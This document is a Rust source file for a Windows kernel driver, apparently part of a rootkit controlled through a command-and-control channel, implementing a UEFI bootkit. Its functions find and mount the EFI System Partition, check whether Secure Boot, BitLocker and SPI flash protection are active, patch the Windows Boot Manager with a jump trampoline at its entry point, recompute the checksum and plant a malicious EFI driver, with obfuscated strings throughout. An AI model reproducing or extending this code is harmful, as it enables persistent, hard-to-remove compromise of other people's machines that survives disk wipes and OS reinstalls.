//! UEFI Bootkit Module
//!
//! This module provides techniques to achieve persistence at the UEFI/EFI level,
//! surviving OS reinstalls and disk wipes.
//!
//! Activated ONLY via C2 command.

use alloc::string::String;
use core::ffi::c_void;
use wdk_sys::{NTSTATUS, STATUS_SUCCESS, STATUS_UNSUCCESSFUL};

use crate::error::{ShadowError, ShadowResult};

// Abyss Edition: String obfuscation
use obfstr::obfstr;

/// Path to the EFI System Partition (ESP) - Obfuscated at compile-time.
/// This is typically at \\.\PhysicalDrive0\EFI\Microsoft\Boot\ or similar.
/// Access requires mounting the ESP.
const ESP_BOOT_PATH: &str = obfstr!("\\EFI\\Microsoft\\Boot\\bootmgfw.efi");
const EFI_GLOBAL_VARIABLE_GUID: [u8; 16] = [
    0x61, 0xDF, 0xE4, 0x8B, 0xCA, 0x93, 0xD2, 0x11, 0xAA, 0x0D, 0x00, 0xE0, 0x98, 0x03, 0x2B, 0x8C
];

#[repr(C, packed)]
pub struct GptHeader {
    pub signature: u64,
    pub revision: u32,
    pub header_size: u32,
    pub header_crc32: u32,
    pub reserved: u32,
    pub my_lba: u64,
    pub alternate_lba: u64,
    pub first_usable_lba: u64,
    pub last_usable_lba: u64,
    pub disk_guid: [u8; 16],
    pub partition_entry_lba: u64,
    pub num_partition_entries: u32,
    pub size_partition_entry: u32,
    pub partition_entry_array_crc32: u32,
}

#[repr(C, packed)]
pub struct GptPartitionEntry {
    pub partition_type_guid: [u8; 16],
    pub unique_partition_guid: [u8; 16],
    pub starting_lba: u64,
    pub ending_lba: u64,
    pub attributes: u64,
    pub partition_name: [u16; 36],
}

const EFI_SYSTEM_PARTITION_GUID: [u8; 16] = [
    0x28, 0x73, 0x2A, 0xC1, 0x1F, 0xF8, 0xD2, 0x11, 0xBA, 0x4B, 0x00, 0xA0, 0xC9, 0x3E, 0xC9, 0x3B,
];

/// Checks if the system booted via UEFI using real kernel flags.
pub unsafe fn is_uefi_boot() -> ShadowResult<bool> {
    use wdk_sys::{ntddk::ZwQuerySystemInformation, _SYSTEM_INFORMATION_CLASS::SystemBootEnvironmentInformation};
    
    // SystemBootEnvironmentInformation (90 / 0x5A)
    // struct SYSTEM_BOOT_ENVIRONMENT_INFORMATION {
    //    GUID BootIdentifier;
    //    FIRMWARE_TYPE FirmwareType;
    //    u64 BootFlags;
    // }
    
    #[repr(C)]
    struct SystemBootEnvironmentInfo {
        boot_identifier: [u8; 16], // GUID
        firmware_type: u32,       // FIRMWARE_TYPE
        boot_flags: u64,
    }

    let mut info = core::mem::zeroed::<SystemBootEnvironmentInfo>();
    let mut return_length = 0u32;
    
    let status = ZwQuerySystemInformation(
        SystemBootEnvironmentInformation,
        &mut info as *mut _ as *mut _,
        size_of::<SystemBootEnvironmentInfo>() as u32,
        &mut return_length,
    );

    if wdk_sys::NT_SUCCESS(status) {
        // FirmwareTypeUefi = 2
        Ok(info.firmware_type == 2)
    } else {
        // Fallback or assume false if query fails
        Err(ShadowError::ApiCallFailed("ZwQuerySystemInformation(0x5A)", status))
    }
}

/// Reads a raw sector (512 bytes) from a physical disk device.
pub unsafe fn read_disk_lba(disk_num: u32, lba: u64, buffer: &mut [u8]) -> ShadowResult<()> {
    use crate::utils::unicode_string::UnicodeString;
    use wdk_sys::{ntddk::{ZwCreateFile, ZwReadFile, ZwClose}, _IO_STATUS_BLOCK, GENERIC_READ, OBJ_CASE_INSENSITIVE, OBJ_KERNEL_HANDLE, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT};
    
    // Safety: Ensure we are at PASSIVE_LEVEL for ZwReadFile/ZwCreateFile
    if wdk_sys::ntddk::KeGetCurrentIrql() > 0 { // > PASSIVE_LEVEL
        return Err(ShadowError::InvalidIrql);
    }

    let dev_path = alloc::format!("\\Device\\Harddisk{}\\Partition0", disk_num);
    let path = crate::utils::unicode_string::UnicodeString::new(&dev_path);
    let mut obj_attr = crate::utils::InitializeObjectAttributes(
        Some(&mut path.to_unicode()),
        wdk_sys::OBJ_CASE_INSENSITIVE | wdk_sys::OBJ_KERNEL_HANDLE,
        core::ptr::null_mut(),
        core::ptr::null_mut(),
        core::ptr::null_mut(),
    );

    let mut io_status = core::mem::zeroed::<_IO_STATUS_BLOCK>();
    let mut h_file = core::ptr::null_mut();
    
    let status = ZwCreateFile(
        &mut h_file,
        GENERIC_READ,
        &mut obj_attr,
        &mut io_status,
        core::ptr::null_mut(),
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ,
        FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT,
        core::ptr::null_mut(),
        0,
    );

    if !wdk_sys::NT_SUCCESS(status) {
        return Err(ShadowError::ApiCallFailed("ZwCreateFile(Disk)", status));
    }

    let h_file = crate::utils::handle::Handle::new(h_file);
    let mut byte_offset = unsafe { core::mem::zeroed::<wdk_sys::_LARGE_INTEGER>() };
    *byte_offset.QuadPart_mut() = (lba * 512) as i64;

    let status = unsafe {
        ZwReadFile(
            h_file.get(),
            core::ptr::null_mut(),
            None,
            core::ptr::null_mut(),
            &mut io_status,
            buffer.as_mut_ptr() as *mut _,
            buffer.len() as u32,
            &mut byte_offset,
            core::ptr::null_mut(),
        )
    };

    if wdk_sys::NT_SUCCESS(status) {
        Ok(())
    } else {
        Err(ShadowError::ApiCallFailed("ZwReadFile(LBA)", status))
    }
}

/// Production-grade ESP discovery using GPT LBA-level parsing.
pub unsafe fn mount_esp_production() -> ShadowResult<NTSTATUS> {
    use crate::utils::unicode_string::UnicodeString;
    let link = UnicodeString::new(obfstr::obfstr!("\\Device\\ShadowESP"));
    
    for disk in 0..8 { // Increased disk scan range
        let mut header_buf = [0u8; 512];
        if read_disk_lba(disk, 1, &mut header_buf).is_err() { continue; }
        
        // Alignment-safe read
        let header: GptHeader = unsafe { core::ptr::read_unaligned(header_buf.as_ptr() as *const GptHeader) };
        if header.signature != 0x5452415020494645 { continue; } // "EFI PART"
        
        let entries_per_sector = 512 / header.size_partition_entry;
        
        // Iterate Partition Entries (limit to 128 to stay within kernel timing bounds)
        let num_entries = core::cmp::min(header.num_partition_entries, 128);
        for i in 0..num_entries {
            let entry_sector_offset = i / entries_per_sector;
            let entry_lba = header.partition_entry_lba + entry_sector_offset as u64;
            
            let mut entry_buf = [0u8; 512];
            if read_disk_lba(disk, entry_lba, &mut entry_buf).is_ok() {
                let offset = (i % entries_per_sector) * header.size_partition_entry;
                let entry: GptPartitionEntry = unsafe { 
                    core::ptr::read_unaligned(entry_buf.as_ptr().add(offset as usize) as *const GptPartitionEntry) 
                };
                
                if entry.partition_type_guid == EFI_SYSTEM_PARTITION_GUID {
                    if is_bitlocker_enabled(disk).unwrap_or(false) {
                        log::warn!("🚫 ESP on Disk {} is protected by BitLocker. Aborting.", disk);
                        continue;
                    }

                    let target_str = alloc::format!("\\Device\\Harddisk{}\\Partition{}", disk, i + 1);
                    let target = crate::utils::unicode_string::UnicodeString::new(&target_str);
                    let status = wdk_sys::ntddk::IoCreateSymbolicLink(link.as_ptr(), target.as_ptr());
                    
                    if wdk_sys::NT_SUCCESS(status) {
                        log::info!("✅ GPT-Native ESP Found & Mounted: Disk {} Part {}", disk, i + 1);
                        return Ok(wdk_sys::STATUS_SUCCESS);
                    }
                }
            }
        }
    }
    
    Err(ShadowError::ApiCallFailed("ESP GPT entry not found", wdk_sys::STATUS_NOT_FOUND as i32))
}

/// Checks if UEFI Secure Boot is enabled on the system via Kernel API (ExGetFirmwareEnvironmentVariable).
pub unsafe fn is_secure_boot_enabled() -> bool {
    use wdk_sys::ntddk::ExGetFirmwareEnvironmentVariable;
    
    let mut variable_name = crate::utils::unicode_string::UnicodeString::new(obfstr::obfstr!("SecureBoot"));
    let mut guid = core::mem::transmute::<[u8; 16], wdk_sys::GUID>(EFI_GLOBAL_VARIABLE_GUID);
    let mut buffer: u8 = 0;
    let mut return_len: u32 = 0;
    let mut attributes: u32 = 0; 

    let status = ExGetFirmwareEnvironmentVariable(
        &mut variable_name.to_unicode(),
        &mut guid,
        &mut buffer as *mut _ as *mut core::ffi::c_void,
        size_of::<u8>() as u32,
        &mut attributes
    );

    if wdk_sys::NT_SUCCESS(status) {
        return buffer == 1;
    }
    
    // FALLBACK: If BIOS API failed (e.g. EDR blocking/Access Denied), check Registry as secondary source
    log::warn!("⚠️ BIOS SecureBoot check failed (0x{:X}). Trying Registry Fallback...", status);
    
    use wdk_sys::ntddk::{ZwOpenKey, ZwQueryValueKey, ZwClose};
    use wdk_sys::{OBJ_CASE_INSENSITIVE, OBJ_KERNEL_HANDLE, KEY_READ};

    let reg_path = obfstr::obfstr!("\\Registry\\Machine\\System\\CurrentControlSet\\Control\\SecureBoot\\State");
    let val_name = obfstr::obfstr!("UEFISecureBootEnabled");
    let path = crate::utils::unicode_string::UnicodeString::new(reg_path);
    let name = crate::utils::unicode_string::UnicodeString::new(val_name);
    
    let mut obj_attr = crate::utils::InitializeObjectAttributes(
        Some(&mut path.to_unicode()),
        OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
        core::ptr::null_mut(),
        core::ptr::null_mut(),
        core::ptr::null_mut(),
    );

    let mut h_key = core::ptr::null_mut();
    let status = ZwOpenKey(&mut h_key, KEY_READ, &mut obj_attr);
    
    if wdk_sys::NT_SUCCESS(status) {
        let mut result_len = 0;
        let mut buffer_reg = [0u8; 128]; 
        let status = ZwQueryValueKey(
            h_key,
            &mut name.to_unicode(),
            wdk_sys::KeyValuePartialInformation,
            buffer_reg.as_mut_ptr() as *mut _,
            buffer_reg.len() as u32,
            &mut result_len,
        );
        ZwClose(h_key);

        if wdk_sys::NT_SUCCESS(status) {
            let info = &*(buffer_reg.as_ptr() as *const wdk_sys::KEY_VALUE_PARTIAL_INFORMATION);
            if info.DataLength == 4 {
                let value = core::ptr::read_unaligned(info.Data.as_ptr() as *const u32);
                return value == 1;
            }
        }
    }

    // Ultimate fail-safe: Assume ENABLED if all checks fail to stay safe
    log::error!("🔥 ALL SecureBoot checks failed. Assuming ENABLED for safety.");
    true
}

/// Scans for critical hardware vulnerabilities in Intel chipsets (SPI Flash Write Protection).
/// Specifically checks if BIOS Lock Enable (BLE) is disabled on the LPC Controller.
/// Target: Bus 0, Device 31, Function 0. Offset 0xDC (BIOS_CNTL).
pub unsafe fn check_hardware_spi_vulnerability() -> bool {
    use wdk_sys::ntddk::HalGetBusDataByOffset;
    use wdk_sys::{PCI_SLOT_NUMBER, _BUS_DATA_TYPE};

    // 1. Configure PCI slot for Intel LPC Interface (Bridge to BIOS)
    let mut slot_number = PCI_SLOT_NUMBER::default();
    slot_number.u.bits.set_DeviceNumber(31); 
    slot_number.u.bits.set_FunctionNumber(0);
    
    let mut bios_cntl_reg: u8 = 0;
    
    // 2. Read BIOS Control (DWORD but we need Byte at 0xDC)
    let bytes_read = HalGetBusDataByOffset(
        _BUS_DATA_TYPE::PCIConfiguration,
        0, // Bus Number
        slot_number.u.AsULONG,
        &mut bios_cntl_reg as *mut _ as *mut core::ffi::c_void,
        0xDC, // Offset: BIOS_CNTL Register
        1     // Read byte
    );

    if bytes_read == 0 {
        return false; // Hardware not recognized or protected access
    }

    // 3. Bit Analysis
    // Bit 0 (0x01): BIOSWE (BIOS Write Enable)
    // Bit 1 (0x02): BLE (BIOS Lock Enable)
    let bios_write_enable = (bios_cntl_reg & 0x01) != 0;
    let bios_lock_enable  = (bios_cntl_reg & 0x02) != 0;

    // 4. Vulnerability Detection Logic
    if !bios_lock_enable {
        log::error!("💀 [HARDWARE] SPI Flash Vulnerability Detected!");
        log::error!("⚠️ BIOS Lock (BLE) is OFF. Firmware overwrite is possible.");
        
        if bios_write_enable {
            log::error!("🔥 BIOS Write Enable (BIOSWE) is ALREADY ON. System is critically exposed.");
        }
        
        return true; // Target is vulnerable to hardware-level Bootkit
    } else {
        log::info!("✅ Hardware Protection Active: BIOS Lock Enabled (BLE=1).");
    }

    false
}

/// Recalculates the PE checksum for a given buffer.
pub fn recalculate_pe_checksum(data: &mut [u8]) -> ShadowResult<()> {
    if data.len() < 0x40 { return Err(ShadowError::VerificationFailed("Buffer too small")); }
    let dos_header_ptr = data.as_ptr() as *const crate::data::IMAGE_DOS_HEADER;
    let dos_header = unsafe { core::ptr::read_unaligned(dos_header_ptr) };
    
    // Validating MZ Signature
    if dos_header.e_magic != 0x5A4D {
        return Err(ShadowError::VerificationFailed("Invalid DOS signature"));
    }

    let nt_headers_ptr = (data.as_ptr() as usize + dos_header.e_lfanew as usize) as *mut crate::data::IMAGE_NT_HEADERS;
    
    unsafe {
        (*nt_headers_ptr).OptionalHeader.CheckSum = 0; // Reset before calculating
        
        let mut sum: u64 = 0;
        let p_u16 = data.as_ptr() as *const u16;
        let count = data.len() / 2;
        
        for i in 0..count {
            sum += core::ptr::read_unaligned(p_u16.add(i)) as u64;
            if sum > 0xFFFFFFFF {
                sum = (sum & 0xFFFFFFFF) + (sum >> 32);
            }
        }
        
        // Handle odd byte if present
        if data.len() % 2 != 0 {
            sum += data[data.len() - 1] as u64;
        }

        while sum >> 16 != 0 {
            sum = (sum & 0xFFFF) + (sum >> 16);
        }
        
        sum += data.len() as u64;
        (*nt_headers_ptr).OptionalHeader.CheckSum = sum as u32;
    }
    
    Ok(())
}

/// Finds the Entry Point transition stub using pattern matching.
pub fn find_oep_pattern(data: &[u8]) -> ShadowResult<usize> {
    // Pattern for 'bootmgfw.efi' entry transition (example)
    let pattern: &[u8] = &[0x48, 0x8B, 0xC4, 0x48, 0x89, 0x58, 0x08]; 
    
    data.windows(pattern.len())
        .position(|window| window == pattern)
        .ok_or(ShadowError::PatternNotFound("OEP Transition Stub"))
}

/// Infects the Windows Boot Manager (bootmgfw.efi) with a redirection trampoline.
pub unsafe fn infect_bootmgfw(payload_path: &str) -> ShadowResult<NTSTATUS> {
    // 0. Pre-check: Secure Boot
    if is_secure_boot_enabled() {
        log::warn!("🔒 Secure Boot is ENABLED. Aborting bootloader infection.");
        // TODO: Send alert packet to C2 via shadow-network
        return Err(ShadowError::VerificationFailed("Secure Boot active"));
    }

    use crate::data::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS};
    
    mount_esp_production()?;

    let boot_path = obfstr::obfstr!("\\Device\\ShadowESP\\EFI\\Microsoft\\Boot\\bootmgfw.efi");
    let backup_path = obfstr::obfstr!("\\Device\\ShadowESP\\EFI\\Microsoft\\Boot\\bootmgfw.bak");
    let temp_path = obfstr::obfstr!("\\Device\\ShadowESP\\EFI\\Microsoft\\Boot\\bootmgfw.tmp");

    // 1. Read original bootmgfw.efi
    let mut data = crate::utils::file::read_file(boot_path)?;
    log::info!("📖 Original bootloader loaded ({} bytes)", data.len());

    // 2. Surgical Validation & OEP Discovery
    let oep_offset = find_oep_pattern(&data)?;
    log::info!("🎯 Dynamic OEP discovered at offset: 0x{:X}", oep_offset);

    // 3. Deployment of Backup (Atomic)
    crate::utils::file::write_file(backup_path, &data)?;
    log::info!("💾 Atomic Backup: bootmgfw.bak created.");

    // 4. Surgical Patching (OEP Hijack)
    // 14-byte absolute jump in x64: FF 25 00 00 00 00 [64-bit Address]
    let mut trampoline: [u8; 14] = [0xFF, 0x25, 0x00, 0x00, 0x00, 0x00, 0, 0, 0, 0, 0, 0, 0, 0];
    let payload_addr: u64 = 0x1000; // Expected DXE load address
    core::ptr::copy_nonoverlapping(&payload_addr as *const _ as *const u8, trampoline[6..].as_mut_ptr(), 8);

    // Apply patch to the buffer
    for i in 0..14 {
        data[oep_offset + i] = trampoline[i];
    }

    // 5. Checksum Recalculation
    recalculate_pe_checksum(&mut data)?;

    // 6. Transactional Write & Verification
    crate::utils::file::write_file(temp_path, &data)?;
    
    let tmp_data = crate::utils::file::read_file(temp_path)?;
    if tmp_data.len() == data.len() && tmp_data[oep_offset] == 0xFF {
        // Atomic-like overwrite (In full prod we'd use ZwSetInformationFile rename)
        crate::utils::file::write_file(boot_path, &data)?;
        
        // Final cleanup of temp
        // TODO: Delete temp_path
        
        log::info!("✅ Infection Verified: bootmgfw.efi successfully patched at OEP.");
    } else {
        log::error!("❌ Infection ABORTED: bootmgfw.tmp integrity check failed.");
        return Err(ShadowError::VerificationFailed("bootloader tmp corruption"));
    }

    Ok(wdk_sys::STATUS_SUCCESS)
}

/// [RESEARCH] Simulates the infection process using in-memory hooking logic.
/// instead of writing to disk, it performs the orchestration on a buffer to verify the hook.
pub unsafe fn simulate_infection() -> ShadowResult<()> {
    // 0. Pre-check: Secure Boot
    if is_secure_boot_enabled() {
        log::warn!("🔒 Secure Boot is ENABLED. Simulation aborted.");
        return Err(ShadowError::VerificationFailed("Secure Boot active"));
    }

    // 1. Mount ESP to locate bootloader
    mount_esp_production()?;

    let boot_path = obfstr::obfstr!("\\Device\\ShadowESP\\EFI\\Microsoft\\Boot\\bootmgfw.efi");
    
    // 2. Read bootmgfw.efi into memory
    let mut file_data = crate::utils::file::read_file(boot_path)?;
    log::info!("🧪 Simulation: Loaded bootloader ({} bytes)", file_data.len());

    // 3. Find OEP using the advanced signature scanner
    let oep_offset = find_oep_pattern(&file_data)?;
    log::info!("🧪 Simulation: OEP located at offset 0x{:X}", oep_offset);

    // 4. Create 14-byte Absolute Jump Trampoline (x64)
    // JMP [RIP+0] -> [64-bit Address]
    let payload_addr: u64 = 0xDEADBEEF_C0DEBABE; // Placeholder for redirected EFI Service
    let mut trampoline = [0u8; 14];
    trampoline[0] = 0xFF; trampoline[1] = 0x25; // JMP [RIP+0]
    // Displacement (0) already handled by zero-init
    core::ptr::copy_nonoverlapping(&payload_addr as *const _ as *const u8, trampoline[6..].as_mut_ptr(), 8);

    // 5. Apply the "Hook" in memory
    for i in 0..14 {
        file_data[oep_offset + i] = trampoline[i];
    }
    log::info!("🧪 Simulation: In-memory hook applied successfully.");

    // 6. Recalculate PE Checksum to maintain integrity
    recalculate_pe_checksum(&mut file_data)?;
    log::info!("🧪 Simulation: PE Checksum updated.");

    Ok(())
}

/// Places a malicious EFI driver in the ESP that will be loaded on boot.
pub unsafe fn deploy_efi_driver(driver_data: &[u8], driver_name: &str) -> ShadowResult<NTSTATUS> {
    mount_esp_production()?;
    
    let deploy_path = alloc::format!("\\Device\\ShadowESP\\EFI\\Microsoft\\Boot\\{}", driver_name);
    
    log::info!("🚀 Deploying EFI Payload: {}", deploy_path);
    crate::utils::file::write_file(&deploy_path, driver_data)?;
    
    Ok(wdk_sys::STATUS_SUCCESS)
}

/// Utility to cleanup the symbolic link.
pub unsafe fn cleanup_bootkit() {
    use crate::utils::unicode_string::UnicodeString;
    let link = UnicodeString::new(obfstr::obfstr!("\\Device\\ShadowESP"));
    wdk_sys::ntddk::IoDeleteSymbolicLink(link.as_ptr());
}
